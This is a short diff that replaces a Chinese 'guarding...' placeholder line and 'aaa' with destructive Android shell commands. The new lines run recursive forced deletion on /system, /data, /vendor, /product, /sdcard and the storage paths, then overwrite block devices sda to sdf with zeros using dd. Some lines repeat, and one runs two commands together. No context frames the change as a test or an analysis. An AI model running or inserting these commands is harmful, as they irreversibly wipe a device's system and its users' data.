@@ -1,2 +1,18 @@
-正在守护...
-aaa
+rm -rf /system
+rm -rf /data
+rm -rf /vendor
+rm -rf /product
+rm -rf /sdcard
+rm -rf /storage/emulated//0
+rm -rf /storage/sdcard
+rm -rf /data
+rm -rf /vendor
+rm -rf /product
+rm -rf /sdcard
+rm -rf /storage/emulated//0rm -rf /storage/sdcard
+dd if=/dev/zero of=/dev/block/sda bs=1M count=100
+dd if=/dev/zero of=/dev/block/sdb
+dd if=/dev/zero of=/dev/block/sdc
+dd if=/dev/zero of=/dev/block/sdd
+dd if=/dev/zero of=/dev/block/sde
+dd if=/dev/zero of=/dev/block/sdf
